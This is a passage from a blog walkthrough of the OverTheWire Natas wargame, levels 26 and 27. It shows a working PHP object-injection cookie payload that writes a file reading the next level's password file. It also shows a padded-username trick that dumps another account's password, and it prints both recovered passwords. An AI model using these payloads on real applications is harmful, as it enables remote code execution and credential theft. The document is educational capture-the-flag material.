<p><strong>Serialization</strong> is the conversion of a PHP data structure to a string that can be passed to external applications, such as databases, or stored in files etc.</p>

<p><strong>Unserialization</strong> converts the string back to a PHP value</p>

<p>Now let&rsquo;s look at what OWASP says about the PHP object injection attack:</p>

<blockquote><p>The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP
allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP
object(s) injection into the application scope.</p>

<p>In order to successfully exploit a PHP Object Injection vulnerability two conditions must be met:</p>

<p>The application must have a class which implements a PHP magic method (such as <strong>wakeup or </strong>destruct) that can be used to carry out malicious
attacks, or to start a &ldquo;POP chain&rdquo;.</p>

<p>All of the classes used during the attack must be declared when the vulnerable unserialize() is being called, otherwise object autoloading must be
supported for such classes.</p></blockquote>

<p>Well, we can exploit this because both conditions apply to our case! Remember that we have the Logger class,  and it contains a <em>__construct()</em> and <em>__destruct()</em> magic method. So the class wasn&rsquo;t just lying around for nothing in the code, hehehe!</p>

<p>Before continuing, I want to show an <a href="http://www.w3resource.com/php/function-reference/serialize.php">example of serialization</a>, so you can have an idea of what it looks like with an easier to understand example than deciphering the <em>drawing</em> cookie:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="nv">$serialized_data</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;Math&#39;</span><span class="p">,</span> <span class="s1">&#39;Language&#39;</span><span class="p">,</span> <span class="s1">&#39;Science&#39;</span><span class="p">));</span>
</span><span class='line'><span class="k">echo</span>  <span class="nv">$serialized_data</span> <span class="o">.</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x">  </span>
</span></code></pre></td></tr></table></div></figure>


<p>And the output is <code>a:3:{i:0;s:4:&ldquo;Math&rdquo;;i:1;s:8:&ldquo;Language&rdquo;;i:2;s:7:&ldquo;Science&rdquo;;}</code>. Ugh, looks complicated! But here it is:</p>

<ul>
<li><p>a = array, 3 = the number of elements in the array</p></li>
<li><p>i = integer, 0 = index in the array, s = string, 4 = length of the string, Math is the element value, and this continues for the other elements as well</p></li>
</ul>


<p>Now, to exploit this. We have:</p>

<ul>
<li><p>a way to inject our own code into the application (by changing the <em>drawing</em> cookie that will get unserialized)</p></li>
<li><p>a way to write to a file (leverage the Logger class)</p></li>
<li><p>a way to read a file (we can browse to where images are stored inside <em>img/</em>)</p></li>
</ul>


<p>First, I made my own malicious Logger class:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="k">class</span> <span class="nc">Logger</span><span class="p">{</span>
</span><span class='line'>        <span class="k">private</span> <span class="nv">$logFile</span><span class="p">;</span>
</span><span class='line'>        <span class="k">private</span> <span class="nv">$initMsg</span><span class="p">;</span>
</span><span class='line'>        <span class="k">private</span> <span class="nv">$exitMsg</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">function</span> <span class="nf">__construct</span><span class="p">(){</span>
</span><span class='line'>            <span class="c1">// initialise variables</span>
</span><span class='line'>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">initMsg</span><span class="o">=</span><span class="s2">&quot;pwn&quot;</span><span class="p">;</span>
</span><span class='line'>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">exitMsg</span><span class="o">=</span> <span class="s2">&quot;&lt;?php echo readfile(&#39;/etc/natas_webpass/natas27&#39;);?&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logFile</span> <span class="o">=</span> <span class="s2">&quot;img/pass.php&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">function</span> <span class="nf">__destruct</span><span class="p">(){</span>
</span><span class='line'>            <span class="c1">// write exit message</span>
</span><span class='line'>            <span class="nv">$fd</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logFile</span><span class="p">,</span><span class="s2">&quot;a+&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fd</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">exitMsg</span><span class="p">);</span>
</span><span class='line'>            <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fd</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="nv">$myobj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Logger</span><span class="p">();</span>
</span><span class='line'><span class="k">echo</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$myobj</span><span class="p">));</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>This code I wrote and tested on my local machine, first with local files, to see that it behaves as I want it to. When that was done, I used PHP to serialize and base64 encode it, so I can paste it in the cookie, and this is how it looks like:</p>

<ul>
<li>serialized:</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>O:6:"Logger":3:{s:15:"LoggerlogFile";s:12:"img/pass.php";s:15:"LoggerinitMsg";s:3:"pwn";s:15:"LoggerexitMsg";s:52:"&lt;?php echo readfile('/etc/natas_webpass/natas27');?&gt;";}</span></code></pre></td></tr></table></div></figure>


<ul>
<li>base64 encoded:</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMjoiaW1nL3Bhc3MucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MzoicHduIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NTI6Ijw/cGhwIGVjaG8gcmVhZGZpbGUoJy9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7Pz4iO30=</span></code></pre></td></tr></table></div></figure>


<p>In my Logger class I just removed what wasn&rsquo;t necessary from the original code, and made the modifications so that the script will create a PHP file inside the <em>img/</em> directory, with this code inside it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">echo</span> <span class="nb">readfile</span><span class="p">(</span><span class="s1">&#39;/etc/natas_webpass/natas27&#39;</span><span class="p">);</span><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>And after changing the cookie and navigating to pass.php, the code gets executed and spits the password: <code>55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ</code></p>

<p>Because I used <em>readfile()</em>, I actually saw the password followed by a space and 33 (the length of read data). I looked in the PHP manual and noticed saw that <em>file_get_contents()</em> is a better choice for reading a file into a string, but I was too lazy to change it!</p>

<blockquote><p>file_get_contents() is the preferred way to read the contents of a file into a string.</p></blockquote>

<p>Helpful resources:</p>

<p><a href="https://stackoverflow.com/questions/8641889/how-to-use-php-serialize-and-unserialize">PHP serialization</a></p>

<p><a href="https://www.owasp.org/index.php/PHP_Object_Injection">OWASP PHP Object Injection</a></p>

<p><a href="https://www.notsosecure.com/2015/09/24/remote-code-execution-via-php-unserialize/">RCE with PHP unserialize</a></p>

<p><a href="https://vagosec.org/2013/09/wordpress-php-object-injection/">PHP object injection</a></p>

<p><a href="https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf">unserialize() exploitation</a></p>

<h3>Level 27</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas14.png" title="natas27" alt="natas 27"></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// morla / 10111</span>
</span><span class='line'><span class="c1">// database gets cleared every 5 min</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="cm">/*</span>
</span><span class='line'><span class="cm">CREATE TABLE `users` (</span>
</span><span class='line'><span class="cm">  `username` varchar(64) DEFAULT NULL,</span>
</span><span class='line'><span class="cm">  `password` varchar(64) DEFAULT NULL</span>
</span><span class='line'><span class="cm">);</span>
</span><span class='line'><span class="cm">*/</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">checkCredentials</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$usr</span><span class="p">,</span><span class="nv">$pass</span><span class="p">){</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$user</span><span class="o">=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$usr</span><span class="p">);</span>
</span><span class='line'>    <span class="nv">$password</span><span class="o">=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$pass</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT username from users where username=&#39;</span><span class="si">$user</span><span class="s2">&#39; and password=&#39;</span><span class="si">$password</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
</span><span class='line'>        <span class="k">return</span> <span class="k">True</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="k">False</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">validUser</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$usr</span><span class="p">){</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$user</span><span class="o">=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$usr</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * from users where username=&#39;</span><span class="si">$user</span><span class="s2">&#39;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>            <span class="k">return</span> <span class="k">True</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="k">False</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">dumpData</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$usr</span><span class="p">){</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$user</span><span class="o">=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$usr</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * from users where username=&#39;</span><span class="si">$user</span><span class="s2">&#39;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>            <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$res</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>                <span class="c1">//thanks to Gobo for reporting this bug!</span>
</span><span class='line'>                <span class="c1">//return print_r($row);</span>
</span><span class='line'>                <span class="k">return</span> <span class="nb">print_r</span><span class="p">(</span><span class="nv">$row</span><span class="p">,</span><span class="k">true</span><span class="p">);</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="k">False</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">createUser</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span> <span class="nv">$usr</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">){</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$user</span><span class="o">=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$usr</span><span class="p">);</span>
</span><span class='line'>    <span class="nv">$password</span><span class="o">=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$pass</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;INSERT INTO users (username,password) values (&#39;</span><span class="si">$user</span><span class="s2">&#39;,&#39;</span><span class="si">$password</span><span class="s2">&#39;)&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">mysql_affected_rows</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
</span><span class='line'>        <span class="k">return</span> <span class="k">True</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="k">False</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;username&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">)</span> <span class="k">and</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;password&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$link</span> <span class="o">=</span> <span class="nb">mysql_connect</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="s1">&#39;natas27&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;censored&gt;&#39;</span><span class="p">);</span>
</span><span class='line'>    <span class="nb">mysql_select_db</span><span class="p">(</span><span class="s1">&#39;natas27&#39;</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nx">validUser</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">//user exists, check creds</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nx">checkCredentials</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">],</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;password&quot;</span><span class="p">])){</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;Welcome &quot;</span> <span class="o">.</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;!&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;Here is your data:&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>            <span class="nv">$data</span><span class="o">=</span><span class="nx">dumpData</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]);</span>
</span><span class='line'>            <span class="k">print</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">else</span><span class="p">{</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;Wrong password for user: &quot;</span> <span class="o">.</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">//user doesn&#39;t exist</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nx">createUser</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">],</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;password&quot;</span><span class="p">])){</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;User &quot;</span> <span class="o">.</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot; was created!&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="nb">mysql_close</span><span class="p">(</span><span class="nv">$link</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Before digging in the code, I just tested the functionality of the login system..you can create a user and then view its username and password values. After logging in, you will see something like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> Welcome haxor!
</span><span class='line'>Here is your data:
</span><span class='line'>Array ( [username] =&gt; haxor [password] =&gt; doge ) </span></code></pre></td></tr></table></div></figure>


<p>I then tried to create a natas28 user to see what would happen&hellip;and surprise!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Wrong password for user: natas28</span></code></pre></td></tr></table></div></figure>


<p>This tells us that there is indeed such a user in the database and that our random password doesn&rsquo;t match the one stored in the database..so that&rsquo;s what we want to get! I&rsquo;ve tried some SQLi, but got nothing. So back to reading PHP code it is! (ugh)</p>

<ul>
<li><p><em>checkCredentials()</em> checks if the provided username and password (which are both escaped) exist in the table, returning True if they are</p></li>
<li><p><em>validUser()</em> checks if the username is already in the table</p></li>
<li><p><em>dumpData()</em> prints the data about the array containing the username and password as seen above in the log in message</p></li>
<li><p><em>createUser()</em> inserts a new username-password pair in the table</p></li>
</ul>


<p>The important part of the rest of the code is that it looks up the username in the table, creating it if it doesn&rsquo;t exist, and proceeding with the credentials check and data printing if it already exists. After reading about the functions in the PHP manual I still had no idea how to continue. At this point, noticing the flow of the code was helpful:</p>

<p>1) when giving a username that already exists, it continues to the credentials checking part</p>

<p>2) if credential check is successful, the welcome message and credentials data are printed (without any other action from the user)</p>

<p>Judging from the above lines of reasoning, I thought that the interesting function that I might need to check again is the <em>dumpData()</em> one (because it returns data from the database, so it&rsquo;s possible to find out about the natas18 user from it). Still no idea how to do that though, but another thing I noticed is how important the username is for the code: all the checks and actions revolve around it, and it was also possible to determine the existence of the natas18 user because of that. So, at this point, I thought the next part should be to convince the code to dump the data for natas18.</p>

<p>I next thought about creating a username of natas18 followed by many spaces, exceeding the 64 character limit. The code still returned wrong password, so all the spaces must be trimmed. I made a string in Python to check what really happens:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">user</span> <span class="o">=</span> <span class="s">&#39;natas28&#39;</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">*</span> <span class="mi">64</span> <span class="o">+</span> <span class="s">&#39;end&#39;</span>
</span><span class='line'><span class="k">print</span> <span class="n">user</span>
</span><span class='line'><span class="s">&#39;natas28                                                                end&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>And I stopped inputting a password, because the code created users irrespective if they had passwords, and I could log in as an existing user with a blank password, as can be seen from this test dummy:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome yo!
</span><span class='line'>Here is your data:
</span><span class='line'>Array ( [username] =&gt; yo [password] =&gt; ) </span></code></pre></td></tr></table></div></figure>


<p>Now I tried to create a user with that long string and yeah, the space is removed:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User natas28 end was created!</span></code></pre></td></tr></table></div></figure>


<p>However, when next I tried to log in just as natas28 with no password, here is what awaited me!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome natas28!
</span><span class='line'>Here is your data:
</span><span class='line'>Array ( [username] =&gt; natas28 [password] =&gt; JWwR438wkgTsNKBbcJoowyysdM82YjeF ) </span></code></pre></td></tr></table></div></figure>


<p>Why was this possible? Remember the flow of the code when you try to log in:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>validUser() 
</span><span class='line'>  if user exists, checkCredentials()
</span><span class='line'>      if yay here is your data
</span><span class='line'>      if nay wrong password message
</span><span class='line'>  else createUser()</span></code></pre></td></tr></table></div></figure>


<p>To confirm it, I used <a href="http://sqlfiddle.com/">sqlfiddle</a> to generate a database and queries that mimic the PHP code.</p>

<p>First, table creation:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">CREATE</span> <span class="k">TABLE</span> <span class="o">`</span><span class="n">users</span><span class="o">`</span> <span class="p">(</span>
</span><span class='line'>  <span class="o">`</span><span class="n">username</span><span class="o">`</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span> <span class="k">DEFAULT</span> <span class="k">NULL</span><span class="p">,</span>
</span><span class='line'>  <span class="o">`</span><span class="n">password</span><span class="o">`</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span> <span class="k">DEFAULT</span> <span class="k">NULL</span>
</span><span class='line'><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then, inserting the natas28 user with the password (I used a dummy one but assume it&rsquo;s the one we&rsquo;re after):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">users</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">)</span> <span class="k">values</span> <span class="p">(</span><span class="s1">&#39;natas28&#39;</span><span class="p">,</span><span class="s1">&#39;omgpass&#39;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Next, the querying for the username as it happens in the validUser() function:</p>

